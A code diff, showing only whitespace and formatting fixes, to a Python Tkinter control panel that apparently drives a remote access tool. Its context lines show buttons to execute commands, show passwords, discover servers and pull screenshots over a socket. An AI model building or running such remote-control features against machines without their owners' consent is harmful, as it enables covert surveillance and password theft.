@@ -10,6 +10,8 @@ import os
 from PIL import Image, ImageTk
 import pickle
 import progressbar
+
+
 def init():
     global s
     global rot
@@ -86,7 +88,6 @@ def execute():
 
 
 def get_screenshot():
-
     try:
         s.send(b'aW1hZ2UgcXVlcnk=')
     except Exception as e:
@@ -114,7 +115,7 @@ def get_screenshot():
     f = open(os.getcwd() + '/sav.png', 'w+b')
     f.write(base64.b64decode(pic))
     f.close()
-    messagebox.showinfo('saved','Saved in {}{}'.format(os.getcwd(),'/sav.png'))
+    messagebox.showinfo('saved', 'Saved in {}{}'.format(os.getcwd(), '/sav.png'))
     del bar
 
 
@@ -193,7 +194,7 @@ b4 = Button(text='Execute', command=execute)
 b5 = Button(text='Show password', command=show_password)
 b6 = Button(text='Get Screen', command=get_screenshot)
 b7 = Button(text='Discover Server', command=desc_serv)
-t1 = ScrolledText(root1, bg='black', fg='white', height=10, width=70,font=('',11))
+t1 = ScrolledText(root1, bg='black', fg='white', height=10, width=70, font=('', 11))
 listbox = Listbox(root1, bg='black', fg='white', height=7, width=50)
 listbox.insert(END, 'Discovered server will show in here')
 l1.pack()
